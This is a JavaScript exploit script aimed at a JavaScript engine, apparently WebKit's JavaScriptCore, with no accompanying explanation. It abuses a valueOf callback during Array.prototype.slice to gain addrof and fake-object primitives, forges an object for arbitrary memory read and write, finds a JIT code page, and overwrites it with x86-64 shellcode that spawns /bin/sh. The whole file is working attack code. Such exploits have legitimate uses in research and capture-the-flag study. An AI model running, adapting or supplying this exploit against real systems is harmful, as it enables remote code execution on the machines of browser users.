function hex(b) { return ('0' + b.toString(16)).substr(-2); } function hexlify(bytes) { var res = []; for (var i = 0; i < bytes.length; i++) res.push(hex(bytes[i])); return res.join(''); } function unhexlify(hexstr) { if (hexstr.length % 2 == 1) throw new TypeError("Invalid hex string"); var bytes = new Uint8Array(hexstr.length / 2); for (var i = 0; i < hexstr.length; i += 2) bytes[i/2] = parseInt(hexstr.substr(i, 2), 16); return bytes; } function hexdump(data) { if (typeof data.BYTES_PER_ELEMENT !== 'undefined') data = Array.from(data); var lines = []; for (var i = 0; i < data.length; i += 16) { var chunk = data.slice(i, i+16); var parts = chunk.map(hex); if (parts.length > 8) parts.splice(8, 0, ' '); lines.push(parts.join(' ')); } return lines.join('\n'); } var Struct = (function() { var buffer      = new ArrayBuffer(8); var byteView    = new Uint8Array(buffer); var uint32View  = new Uint32Array(buffer); var float64View = new Float64Array(buffer); return { pack: function(type, value) { var view = type; view[0] = value; return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT); }, unpack: function(type, bytes) { if (bytes.length !== type.BYTES_PER_ELEMENT) throw Error("Invalid bytearray"); var view = type; byteView.set(bytes); return view[0]; }, int8:    byteView, int32:   uint32View, float64: float64View }; })(); function Int64(v) { var bytes = new Uint8Array(8); switch (typeof v) { case 'number': v = '0x' + Math.floor(v).toString(16); case 'string': if (v.startsWith('0x')) v = v.substr(2); if (v.length % 2 == 1) v = '0' + v; var bigEndian = unhexlify(v, 8); bytes.set(Array.from(bigEndian).reverse()); break; case 'object': if (v instanceof Int64) { bytes.set(v.bytes()); } else { if (v.length != 8) throw TypeError("Array must have excactly 8 elements."); bytes.set(v); } break; case 'undefined': break; default: throw TypeError("Int64 constructor requires an argument."); } this.asDouble = function() { if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe)) throw new RangeError("Integer can not be represented by a double"); return Struct.unpack(Struct.float64, bytes); }; this.asJSValue = function() { if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff)) throw new RangeError("Integer can not be represented by a JSValue"); this.assignSub(this, 0x1000000000000); var res = Struct.unpack(Struct.float64, bytes); this.assignAdd(this, 0x1000000000000); return res; }; this.bytes = function() { return Array.from(bytes); }; this.byteAt = function(i) { return bytes[i]; }; this.toString = function() { return '0x' + hexlify(Array.from(bytes).reverse()); }; function operation(f, nargs) { return function() { if (arguments.length != nargs) throw Error("Not enough arguments for function " + f.name); for (var i = 0; i < arguments.length; i++) if (!(arguments[i] instanceof Int64)) arguments[i] = new Int64(arguments[i]); return f.apply(this, arguments); }; } this.assignNeg = operation(function neg(n) { for (var i = 0; i < 8; i++) bytes[i] = ~n.byteAt(i); return this.assignAdd(this, Int64.One); }, 1); this.assignAdd = operation(function add(a, b) { var carry = 0; for (var i = 0; i < 8; i++) { var cur = a.byteAt(i) + b.byteAt(i) + carry; carry = cur > 0xff | 0; bytes[i] = cur; } return this; }, 2); this.assignSub = operation(function sub(a, b) { var carry = 0; for (var i = 0; i < 8; i++) { var cur = a.byteAt(i) - b.byteAt(i) - carry; carry = cur < 0 | 0; bytes[i] = cur; } return this; }, 2); } Int64.fromDouble = function(d) { var bytes = Struct.pack(Struct.float64, d); return new Int64(bytes); }; function Neg(n) { return (new Int64()).assignNeg(n); } function Add(a, b) { return (new Int64()).assignAdd(a, b); } function Sub(a, b) { return (new Int64()).assignSub(a, b); } Int64.Zero = new Int64(0); Int64.One = new Int64(1); function exploit(){ print("Part 1: Gain address/object primitives."); function addrof(obj) { var a = []; for (var i = 0; i < 100; i++) a.push(i + 0.1337); var hax = {valueOf: function () { a.length = 0; a = [obj]; return 5; }}; var b = a.slice(0, hax); print(b); return Int64.fromDouble(b[4]); } function createfakeobj(addr) { var a = []; for (var i = 0; i < 100; i++){ a.push({}); } addr = addr.asDouble(); let tmp = a.slice(0, {valueOf: function() { a.length = 0; a = [addr, addr]; return 5; }}); return tmp[4]; } let someObj = {'a': 0x1337, 'b':false, 'c': 13.37, 'd':[1,2,3,4]}; print("Address of someobj:" + addrof(someObj).toString(16)); let someFloat64Array = new Float64Array(17); let someAB = new ArrayBuffer(0x1337); someFloat64Array[0] = -2.226588954618008; someFloat64ArrayAddr =  addrof(someFloat64Array); someABAddr = addrof(someAB); print("- Address of Float64Array:" + someFloat64ArrayAddr.toString(16)); var arbRW = new Uint8Array(0x40); var UarbRW = new Uint32Array(arbRW.buffer); var FarbRW = new Uint32Array(arbRW.buffer); print ("Part 2: Setting up Fake Object..."); var structs = []; for (var i = 0; i < 0x1000; ++i) { var array = [13.37, -1.1888977353814388e+148]; array.pointer = -1.1888977353814388e+148; array['prop' + i] = 13.37; structs.push(array); } var victim = structs[0x800]; print(`[+] victim @ ${addrof(victim)}`); var flags_double_array = new Int64("0x0108200700001000").asJSValue(); var container = { header: flags_double_array, butterfly: victim }; var containerAddr = addrof(container); var hax = createfakeobj(Add(containerAddr, 16)); var origButterfly = hax[1]; function writeInt64(addr, int64){ print("Attempt write " + int64 + " at " + addr); hax[1] = addr.asDouble(); victim[0] = int64.asDouble(); print("Check write " + int64 + " at " + addr); }; function readInt64(addr){ if (!addr) return; hax[1] = addr.asDouble(); var ret = victim[0]; return Int64.fromDouble(ret); }; print("Got prims, with some limitations. JIT some code and expand."); let f = function(y){ if(y != undefined){ y *= 1023; y += 2345; y*= 123433; } return y}; for(let i = 0; i < 0x10000; i++){ f(i); } arbRW.set(new Int64("0x0108200700001000").bytes(), 0x0); let f_addr = addrof(f); arbRW.set(Add(f_addr, 0x18).bytes(), 0x8); print("Data set?" + f_addr); let arbRWAddr = addrof(arbRW); print("arbRW = " + arbRWAddr); let bufferAddr = readInt64(Add(arbRWAddr, 0x10)); print("buffer @ " + bufferAddr); let fullRW = createfakeobj(bufferAddr); let codeObj = Add(Int64.fromDouble(fullRW[0]), 0x8); print("codeObj @ " + codeObj); arbRW.set(Add(codeObj, 0x8).bytes(), 0x8); let lead = Int64.fromDouble(fullRW[1]); print("lead @ " + lead); arbRW.set(lead.bytes(), 0x8); let jitpage = Int64.fromDouble(fullRW[2]); print("JIT: " + jitpage); arbRW.set(jitpage.bytes(), 0x8); let sc = [0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5, 0xcc, 0xcc, 0xcc, 0xcc]; let scConv8 = new Uint8Array(sc.length + 8 + (8 - (sc.length%8))); scConv8.set(sc); let scConvF = new Float64Array(scConv8.buffer); for ( let i = 0; i < scConvF.length; i++){ print("Writing scConvF[" + i + "] = " + Int64.fromDouble(scConvF[i]) + " @ " + Add(jitpage, i*0x8)); fullRW[i] = scConvF[i]; } f(); } exploit(); 
